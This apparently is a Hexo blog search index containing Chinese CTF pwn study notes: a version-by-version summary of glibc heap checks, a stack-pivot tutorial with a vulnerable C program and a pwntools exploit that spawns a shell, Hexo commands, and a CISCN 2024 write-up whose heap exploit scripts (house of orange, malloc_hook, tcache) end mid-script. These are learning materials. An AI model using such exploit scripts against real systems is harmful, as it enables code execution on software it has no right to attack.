<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>各版本堆利用检查总结</title>
      <link href="/2024/06/11/%E5%90%84%E7%89%88%E6%9C%AC%E5%A0%86%E5%88%A9%E7%94%A8%E6%A3%80%E6%9F%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2024/06/11/%E5%90%84%E7%89%88%E6%9C%AC%E5%A0%86%E5%88%A9%E7%94%A8%E6%A3%80%E6%9F%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​之前写题的时候，因为对各个版本的堆不是很熟悉，导致脑子里很乱，完全不知道能做什么。感到很棘手，现在决定重新复习一遍，同时又因为听好多师傅建议分版本总结学习，所以此处顺便总结一下。（其实我感觉写不出来最重要的原因是写的题太少）</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>​简单统计一下常见手法</p><h2 id="简单统计"><a href="#简单统计" class="headerlink" title="简单统计"></a>简单统计</h2><ul><li>unlink</li><li>UAF</li><li>Fastbin Attack</li><li>Unsortbin Attack</li><li>Largebin Attack</li><li>Tcachebin Attack</li><li>Off-By-One</li><li>Off-By-Null</li><li></li></ul><h2 id="简单整理"><a href="#简单整理" class="headerlink" title="简单整理"></a>简单整理</h2><h3 id="unlike"><a href="#unlike" class="headerlink" title="unlike"></a>unlike</h3><p>​chunk块从双链表中取出时，会修改前后相邻块的对应指针。<code>BK-&gt;fd  = FD</code></p><ul><li><p>版本：早期</p><p>保护：无任何检查</p></li><li><p>版本：现在<br>保护：size检查，双向链表检查</p></li></ul><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>​Use After Free，内存块被释放后可以被再次使用，是许多手法的前提</p><ul><li>版本：始终<br>来自程序逻辑本身</li></ul><h3 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h3><p>​指所有基于fastbin机制的漏洞利用方法，但是此处仅说明针对Fastbin的相关检查和保护</p><h4 id="size检查"><a href="#size检查" class="headerlink" title="size检查"></a>size检查</h4><ul><li><p>版本：始终<br>场景：申请内存块（malloc）</p><p>检查size是否与fastbin_index相符</p></li><li><p>版本: 始终<br>状态：释放内存块（free）<br>同时会检查相邻的下一个chunk的size位是否符合标准</p></li></ul><h4 id="地址对齐检查"><a href="#地址对齐检查" class="headerlink" title="地址对齐检查"></a>地址对齐检查</h4><ul><li>版本：始终<br>场景：释放chunk (free)<br>检查要被释放的chunk地址是否对齐</li></ul><h4 id="next-chunk的P位检查"><a href="#next-chunk的P位检查" class="headerlink" title="next_chunk的P位检查"></a>next_chunk的P位检查</h4><ul><li>版本：始终<br>场景：free<br>检查：检查该chunk是否属于使用状态，根据物理相邻下一个chunk的P位判断</li></ul><h4 id="double-free-检查"><a href="#double-free-检查" class="headerlink" title="double free 检查"></a>double free 检查</h4><ul><li>版本：始终<br>场景： free<br>为了性能只检查了链表头指向的chunk</li></ul><h4 id="指针异或保护"><a href="#指针异或保护" class="headerlink" title="指针异或保护"></a>指针异或保护</h4><ul><li><p>版本：2.32-2.33<br>场景：free<br>加入了指针异或防护，在存储next指针时，不再直接存储地址，而是存储( pos &gt;&gt; 12 ) ^ ptr这个结构，pos代表指针地址，而ptr代表在该next指针“想”指向的地址<br>注：其实我感觉pos更像是heap_base，因为原文注解是这样的:</p><blockquote><p>Use randomness from ASLR (mmap_base) to protect single-linked lists of Fast-Bins and TCache. That is, mask the “next” pointers of the lists’ chunks, and also perform allocation alignment checks on them.</p></blockquote></li><li><p>版本：2.34-至今<br>场景：free<br>key域的值变为一个随机数。</p></li></ul><h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p>​相对来说算是一个比较老一些的漏洞了，现在已经基本无法发挥作用。但是索性largebin attack算的上是一个平替。另外现在unsorted bin的特性更多的被用来作为其他漏洞利用方式的辅助。</p><ul><li><p>版本：&lt;2.29<br>场景：attack</p><p>可以将在任意地址写一个较大的值，但是在2.29之后要求修改地址是一个特定指针。（实际上2.28时就加上了会检查bck-&gt;fd是否正常）（另一个替代方案是tcache_stashing_unlink）</p></li></ul><h3 id="Tcachebin-Attack"><a href="#Tcachebin-Attack" class="headerlink" title="Tcachebin Attack"></a>Tcachebin Attack</h3><p>​2.27版本之后加入的机制，关于这个的总结的话直接上链接吧 &#x3D;&#x3D;&gt; <a href="https://www.cnblogs.com/JmpCliff/articles/17359951.html">传送门</a> </p><h2 id="参考文章及源码阅读"><a href="#参考文章及源码阅读" class="headerlink" title="参考文章及源码阅读"></a>参考文章及源码阅读</h2><ol><li>[Glibc高版本堆利用方法总结 - Lynne&#96;s Blog](<a href="https://www.cnblogs.com/LynneHuan/p/17822172.html">https://www.cnblogs.com/LynneHuan/p/17822172.html</a>)</li><li><a href="https://gitcode.com/shellphish/how2heap/tree/master/glibc_2.23">how2heap</a></li><li><a href="https://blog.csdn.net/easy_level1/article/details/115724038">[总结型]记CTF PWN中过气的堆利用 - CSDN</a></li><li><a href="https://www.cnblogs.com/JmpCliff/articles/17359951.html">tcache七星剑法：序言——基础知识与版本变迁 - Jmp.cliff</a></li><li><a href="http://t.csdnimg.cn/yLIga">house of spirit -CSDN</a></li><li><a href="https://bbs.kanxue.com/thread-278871.htm#msg_header_h1_1">[原创]深入理解Pwn_Heap及相关例题 - 看雪论坛</a></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/">ptmalloc2 - CTF Wiki (ctf-wiki.org)</a></li><li><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c">源码阅读请点这里</a></li></ol><h1 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h1><p>​好了，大概就先整这么多吧。听完组会之后，感觉自己的思路发生了一些改变，其实正这篇笔记主要是觉得自己之前基础打的不是很牢固，想这趁着这个机会好好整理下，结果发现网络上关于各个版本新加入什么保护这样的资源没有现成的整理好的（其实我觉得<del>更可能是</del>肯定是我没找到），总之苦逼的自己看着源码在整理。不过感觉这两天收获还不错，暂时先不整理了，太菜了我….学学漏洞然后再来吧</p><p>哦对了，学了个新名词来着，现在我收集的这些叫补丁（patch），所以我做的事情就是收集新打的补丁，乐…</p>]]></content>
      
      
      <categories>
          
          <category> 分版本总结一下堆利用过程中需要绕过的保护，算是重新复习一下，回忆的来看 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移专项学习</title>
      <link href="/2024/06/01/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A1%B9%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/01/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A1%B9%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h1><p>​对栈迁移还是不熟悉，还得练，所以有了这篇文章，是复习，也是重新学习，由于有点懒，没太详细些，我认为重要的还是本篇文章拓宽了一下我对程序执行流程的思路，另外让我对漏洞利用的手法有了新的态度吧。另外，本篇文章主要还是学习国资师傅的文章的时候做的笔记。引用较多，且实例较少，我就调了一个程序，感觉差不多就没多写了。</p><p>​栈迁移（stack pivote）又叫**伪造栈帧(<code>fake frame</code>)**，即利用<code>leave,ret</code>指令将<code>bp,sp</code>移动到自己想要的地方。最终目的还是控制<code>ip</code>从而控制程序流</p><h2 id="普通栈迁移"><a href="#普通栈迁移" class="headerlink" title="普通栈迁移"></a>普通栈迁移</h2><p>通过<code>leave ret</code>逐步将栈迁移到目标位置，使用场景</p><blockquote><ol><li>主函数不能返回（例如 ： <code>HITCON-Training  LAB6</code>）</li><li><code>ret2dlresolve</code> 需要栈帧一般都非常长，这时候选择栈迁移能很好的省去一些不必要的麻烦。</li><li>只能溢出1个或者2个字长，这种题目就等于把：“请栈迁移”写在脸上。这种题目的特点是两次输入，也分为两种情况。<ol><li>迁移到栈上，第1次输入是泄露地址，第2次是布置栈帧 + 迁移。</li><li>迁移到非栈上，1次输入是在非栈上布置栈帧，另1次迁移至非栈上，两次顺序可以互换。</li></ol></li></ol></blockquote><h2 id="一阶栈迁移"><a href="#一阶栈迁移" class="headerlink" title="一阶栈迁移"></a>一阶栈迁移</h2><p>对于溢出字长过短的情况，也可以有两种模式</p><blockquote><ol><li>可以溢出到返回地址自行布置 <code>leave ret</code> </li><li>只能溢出覆盖 rbp，必须利用原本函数中有的两次 leave ret 来完成迁移。</li></ol></blockquote><p>需要注意的是，第二种情况可能会出现第一次<code>leave ret</code>后执行其他函数，导致栈上的数据被污染的情况。针对此种情况最好的解决办法是迁移到未被污染的地方，或者执行onegadget</p><h2 id="二阶栈迁移"><a href="#二阶栈迁移" class="headerlink" title="二阶栈迁移"></a>二阶栈迁移</h2><p>除了溢出字长过短之外，有可能栈帧长度也极短</p><blockquote><ol><li>栈上的回头反打</li><li>非栈上的二阶栈迁移</li></ol></blockquote><h3 id="栈上的回头反打"><a href="#栈上的回头反打" class="headerlink" title="栈上的回头反打"></a>栈上的回头反打</h3><p>​在栈上栈帧长度不够时，把能拆的步骤拆开，不断回头多次栈迁移即可</p><p>(稍后插入练习)</p><h3 id="非栈上的二阶栈迁移"><a href="#非栈上的二阶栈迁移" class="headerlink" title="非栈上的二阶栈迁移"></a>非栈上的二阶栈迁移</h3><p>首先插入一段引用，说明一下库函数会抬高栈帧，需要抬高的栈帧可写:</p><blockquote><p>程序 <code>bss</code> 段毕竟长度有限，绝大多数库函数都需要一定的栈帧，尤其是 <code>system</code> 函数需要 <code>0x200</code> ，并且  <code>bss</code> 段前面可能还有一些程序需要的数据，所以迁移的位置需要一定的考量</p></blockquote><p>当非栈上的可控区域长度不足时，可以考虑迁移到非栈上之后二次栈迁移。通过ret2csu，仅需要0x80字节即可为所欲为</p><h2 id="三阶栈迁移"><a href="#三阶栈迁移" class="headerlink" title="三阶栈迁移"></a>三阶栈迁移</h2><p>难道0x80的长度就是极限了么？不能进一步缩小栈帧长度吗？答案是，可以！</p><h3 id="灵魂呼叫"><a href="#灵魂呼叫" class="headerlink" title="灵魂呼叫"></a>灵魂呼叫</h3><h4 id="1-你使用过call吗"><a href="#1-你使用过call吗" class="headerlink" title="1. 你使用过call吗"></a>1. 你使用过call吗</h4><p>在汇编代码中，调用其他函数一般有 2 种方式，一种是 <code>call</code> ，一种是 <code>jmp(jcc)</code> 。其中，大多是用 <code>call</code> 的形式，<code>plt</code> 表中使用的为 <code>jmp</code> 形式。</p><h4 id="2-call-read-移形换影"><a href="#2-call-read-移形换影" class="headerlink" title="2. call read 移形换影"></a>2. call read 移形换影</h4><p>call指令会将<code>ip</code>压栈，然后<code>ret</code>时将<code>ip</code>弹出。如果我们call的是read函数，而此时数据又能覆盖到存储<code>ip</code>的位置，那么，如果我们将ip修改，就能返回到我们想要返回的地方</p><h4 id="3-栈帧拼接"><a href="#3-栈帧拼接" class="headerlink" title="3. 栈帧拼接"></a>3. 栈帧拼接</h4><p>通过call read可以将两个或多个栈帧拼接到一起，向栈上写入数据与在bss段写入数据可以有很多组合方式。</p><h3 id="左右横跳"><a href="#左右横跳" class="headerlink" title="左右横跳"></a>左右横跳</h3><p>通过控制栈帧，最终实现任意地址写的功能</p><h3 id="移形换影"><a href="#移形换影" class="headerlink" title="移形换影"></a>移形换影</h3><p>利用<code>call_read</code>时的<code>ret</code>，在read结束时重新劫持程序流，在使用的时候要注意sp指针的位置。通常来说控制sp位于可控地址的最低处最好，可以防止栈帧污染数据。</p><h2 id="爆栈之术"><a href="#爆栈之术" class="headerlink" title="爆栈之术"></a>爆栈之术</h2><p>你该知道的，总有些时候没办法泄露关键信息的，这时候只能尝试一下覆盖栈的最后一位，试试运气啦</p><h2 id="重启大法"><a href="#重启大法" class="headerlink" title="重启大法"></a>重启大法</h2><p>略</p><h1 id="开始抽象"><a href="#开始抽象" class="headerlink" title="开始抽象"></a>开始抽象</h1><h2 id="手法归纳"><a href="#手法归纳" class="headerlink" title="手法归纳"></a>手法归纳</h2><p>​简单归纳一下学到的手法及作用</p><ul><li>call_read 移形换影：结束时会有一个call的ret保存在栈上，若可向该地址写入ret,就可以在read结束后立即控制栈帧</li><li>call_read 栈上写：通常来说调用read函数的汇编寻址都是基于bp指针偏移的，只要控制bp指针的位置就可以控制写入的位置</li><li>栈帧拼接：通过适当布置可以使读入内容不断向后或向前推进，可通过循环分多次读入</li><li>左右横跳：通过“中转地址”实现任意地址写</li><li>sp 控位：控制sp指向读入开始的地方然后写入ROP链</li></ul><h2 id="手法总结"><a href="#手法总结" class="headerlink" title="手法总结"></a>手法总结</h2><p>​总结一下上述手法</p><h3 id="移形换影-1"><a href="#移形换影-1" class="headerlink" title="移形换影"></a>移形换影</h3><p>​函数leave ret后，若再次利用call read流程，就可以布栈</p><p>此时有两种情况</p><ul><li><p>若无puts等函数污染，则可以直接利用残留的寄存器值在原位置再写一次，此时，可以直接覆写read的返回地址，继续挟持程序流</p></li><li><p>观察汇编代码可以看到，read的地址多半是通过bp寄存器偏移得到的，所以控制了bp寄存器的值就可以控制读入位置。</p></li></ul><h3 id="栈帧拼接"><a href="#栈帧拼接" class="headerlink" title="栈帧拼接"></a>栈帧拼接</h3><p>​通过跳转指令（jmp、ret），将数块ROP片段拼接到一起，达到目的</p><h3 id="左右横跳-1"><a href="#左右横跳-1" class="headerlink" title="左右横跳"></a>左右横跳</h3><p>​中转地址做“中转站”实现任意地址写</p><h3 id="sp控位"><a href="#sp控位" class="headerlink" title="sp控位"></a>sp控位</h3><p>​控制sp的位置，使call_read时返回地址刚好是写入开始的地方，本次写入就可以作为ROP链。</p><p>​另外，举个例子，如果有函数调用对栈上数据污染的情况，可以利用移形换影配合leave_ret避免污染，仅需要三个字长的读入，且栈迁移后还可以通过寄存器残留在原位置重新布置两字长的payload内容。</p><h2 id="思路探析"><a href="#思路探析" class="headerlink" title="思路探析"></a>思路探析</h2><p>​其实回头再来看的话，似乎这个发现的过程就是对汇编指令的加深理解，是对程序执行流程的更进一步。但是我们应该看到由此可以窥见的更多手法的雏形。随着我们对程序执行过程的理解不断加深，肯定会出现各种各样的利用方式，有些的泛用性比较广泛，可以达到各种各样的效果。当然我们可以在再次见到的时候一点一点构造利用过程，最终达到目的。但是，这样必然会浪费大量的时间。而且散碎的知识也不利于我们的思考过程。若可以将大多数手法泛用化，将利用方式总结起来，让我们不必更多地思考实现细节，而是从产生条件、达到效果这两个方面来思考问题。这样我们将可以做到更快更好。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>​对《从0到1》上的比喻有了更深的感悟，内功高手也要修炼武功招式，否则就是空有境界，始终称不上真正的高手的。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="call-read"><a href="#call-read" class="headerlink" title="call_read"></a>call_read</h2><p>整了道题，练练手，就开个nx保护得了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">char buf[0x10];</span><br><span class="line">puts(&quot;Input your context:&quot;);</span><br><span class="line">read(0,buf,0x20);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">char hallo[]=&quot;This is a test.&quot;;</span><br><span class="line">puts(hallo);</span><br><span class="line">vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">pwnfile = &quot;./call_read&quot;</span><br><span class="line">sh = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"># 在这个过程中sp与read的地址无关，仅用于leave 和 ret</span><br><span class="line"></span><br><span class="line"># leave ret, bp -&gt; bss</span><br><span class="line">bss = elf.bss() + 0x800</span><br><span class="line">call_read = 0x401187</span><br><span class="line">stack_read = 0x401171</span><br><span class="line">payload = b&#x27;a&#x27;*0x10 + p64(bss) + p64(stack_read)</span><br><span class="line">sh.sendafter(b&quot;context:\n&quot;,payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line"></span><br><span class="line"># leave ret, sp -&gt; bss, bp -&gt; buf, stack_read</span><br><span class="line">stack_puts = 0x4011b7</span><br><span class="line">puts_got = 0x404018</span><br><span class="line">payload = flat([b&#x27;a&#x27;*0x10, bss+0x100, call_read])</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line"></span><br><span class="line"># 布置bss, call_read</span><br><span class="line">payload = flat([stack_puts, b&#x27;a&#x27;*0x8, b&#x27;/bin/sh\0&#x27;, stack_read])</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"># leave ret, sp -&gt; buf, bp -&gt; bss, stack_read</span><br><span class="line">payload = flat([b&#x27;a&#x27;*0x10, bss-0x18, stack_read])</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(0.2)</span><br><span class="line">payload = b&#x27;a&#x27;*0x10 + p64(0x404028)</span><br><span class="line">sh.send(payload)</span><br><span class="line">puts_addr = u64(sh.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.info(&quot;puts_addr is -&gt; 0x%x&quot; %puts_addr)</span><br><span class="line"></span><br><span class="line"># 推测libc_base</span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(&quot;libc_base is -&gt; 0x%x&quot; %libc_base)</span><br><span class="line"></span><br><span class="line"># 用libc中的gadget</span><br><span class="line">libc_pop_rdi_ret = 0x2a3e5 + libc_base</span><br><span class="line">binsh_addr = bss</span><br><span class="line">leave_ret = 0x40118d</span><br><span class="line">ret = 0x40101a</span><br><span class="line">shell_rop = flat([ret, libc_pop_rdi_ret, binsh_addr,  system_addr])</span><br><span class="line"></span><br><span class="line"># read移形换影执行下次内容</span><br><span class="line">payload = flat([bss+0x8-0x18, stack_read, bss-0x10-0x18, leave_ret])</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">#pause()</span><br><span class="line">sh.send(shell_rop)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>移形换影，左右横跳，sp控位都用到了，但是没栈帧拼接。就一次输入嘛，怎么说呢？其实感觉差不多，自己意会吧</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> pwn - stack </category>
          
          <category> 栈迁移 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 使用概述</title>
      <link href="/2024/05/26/Hexo-%E4%BD%BF%E7%94%A8%E6%A6%82%E8%BF%B0/"/>
      <url>/2024/05/26/Hexo-%E4%BD%BF%E7%94%A8%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>本地预览</strong></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> hexo clean</span><br><span class="line"><span class="variable">$</span> hexo g</span><br><span class="line"><span class="variable">$</span> hexo s</span><br></pre></td></tr></table></figure><p><strong>上传个人博客到github</strong> （注意此步骤需要使用Git Bash登录github仓库）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><p><strong>新建布局</strong> (其中，layout是文章类型，可选项有<code>page</code>页面,<code>post</code>文章,<code>draft</code>草稿.</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> hexo new [<span class="type">layout</span>] &lt;title&gt;</span><br></pre></td></tr></table></figure><p><strong>发布草稿</strong> (也可以手动将_dragts文件夹下的草稿移动到_posts目录)</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> hexo publish &lt;title&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscnwp 2024</title>
      <link href="/2024/05/18/ciscnwp/"/>
      <url>/2024/05/18/ciscnwp/</url>
      
        <content type="html"><![CDATA[<h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><p>​保护全开，四肢健全，但是<code>free</code>和<code>show</code>有次数限制。有uaf漏洞，但是无法保存</p><p><img src="/2024/05/18/ciscnwp/image-20240518220736696.png" alt="image-20240518220736696"></p><p><img src="/2024/05/18/ciscnwp/image-20240518220457079.png" alt="image-20240518220457079"></p><p>​因为是glibc 2.23，所以可以利用<code>malloc_hook</code>跳转到ogg。</p><p>但是需要先<code>leak libc_base</code>,然后还要将堆申请到malloc，所以我们使用house of orange获得第一个free块，用来leak libc。</p><p><img src="/2024/05/18/ciscnwp/image-20240519183611228.png" alt="image-20240519183611228"></p><p>随后fast bin打malloc_hook上的ogg获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./orange_cat_diary&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;8.147.131.176&#x27;,18383)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;name&quot;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use &quot;house of orange&quot; to leak libc_base.</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0xf91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">malloc_hook = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x678</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fd指针用来申请malloc_hook处的堆块</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">0x20</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set malloc_hook to ogg</span></span><br><span class="line">edit(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">3</span>)+p64(malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0xf03a4</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">log.info(<span class="string">&quot;malloc_hook is 0x%x&quot;</span> %malloc_hook)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/ciscnwp/image-20240519190255055.png" alt="image-20240519190255055"></p><p>获得flag</p><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p>保护全开，四肢健全，无uaf，有堆溢出</p><p><img src="/2024/05/18/ciscnwp/image-20240519173404911.png" alt="image-20240519173404911"></p><p><img src="/2024/05/18/ciscnwp/image-20240519173252425.png" alt="image-20240519173252425"></p><p>另外，注意到开了沙盒，所以堆环境很乱</p><p><img src="/2024/05/18/ciscnwp/image-20240519173944505.png" alt="image-20240519173944505"></p><p>​首先将chunk释放到unsorted bin中leak libc_base,随后用同样的方法释放到空的tcache中leak heap_base。</p><p><img src="/2024/05/18/ciscnwp/image-20240519184508749.png" alt="image-20240519184508749"></p><p>​随后 tcache attack 打 envion，将堆块申请到<code>envion</code>处 leak stack.</p><p>​最后 tcache attack 打栈上的orw即可获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">path = <span class="string">&#x27;./EzHeap&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line">context.arch=elf.arch</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;8.147.129.121&#x27;,42744)</span></span><br><span class="line">io=process(path)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;content:&#x27;</span>,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">a,c,b</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(c))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;content:&#x27;</span>,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">a</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">a</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span 